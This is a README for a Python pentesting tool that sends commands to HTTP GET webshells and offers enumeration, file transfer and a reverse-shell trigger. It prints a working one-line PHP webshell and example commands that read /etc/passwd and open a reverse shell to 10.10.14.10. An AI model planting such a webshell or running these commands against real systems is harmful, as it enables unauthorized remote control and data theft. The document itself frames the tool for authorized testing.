# Webshell Handler
A small Python tool for interacting with simple HTTP GET webshells during penetration testing.
The project provides two versions:
* **webshell_handler_mini.py** – minimal interactive client
* **webshell_handler.py** – extended handler with enumeration, file transfer and reverse shell support.
The scripts communicate with a remote webshell by sending commands through a specified HTTP parameter and printing the server response.

## Features

### webshell_handler_mini.py
Minimal interactive client:
* command execution via HTTP GET webshell
* simple interactive prompt
* graceful exit handling

### webshell_handler.py
Extended version with additional functionality:
* interactive command execution
* OS detection
* Linux / Windows privilege escalation enumeration
* file download (base64)
* file upload (base64)
* reverse shell trigger
* command history
* tab completion

## Requirements
Python **3.10+**
Dependency:

Uses the Python HTTP library Requests.
```bash
requests>=2.31.0

#Requirements installation:
pip install -r requirements.txt
```

## Usage

### Minimal client
```bash
python3 webshell_handler_mini.py <webshell_url> <command_parameter>

# Example:
python3 webshell_handler_mini.py http://target/webshell.php cmd
```

### Full handler
```bash
python3 webshell_handler.py <webshell_url> <command_parameter>

# Example:
python3 webshell_handler.py http://target/webshell.php cmd
```

## Example Webshell
Example PHP webshell.php used by the handler:
```php
<?php system($_GET['cmd']); ?>

# Example GET request:
http://target/webshell.php?cmd=id
```

## Example Commands (Full Handler)
```bash
help
detect
enum
download /etc/passwd
upload local.txt /tmp/local.txt
rev 10.10.14.10 4444
exit
```

## Disclaimer
This tool is intended **for educational purposes and authorized penetration testing only**.
Do not use it against systems without explicit permission.

## License
MIT License – see `LICENSE`.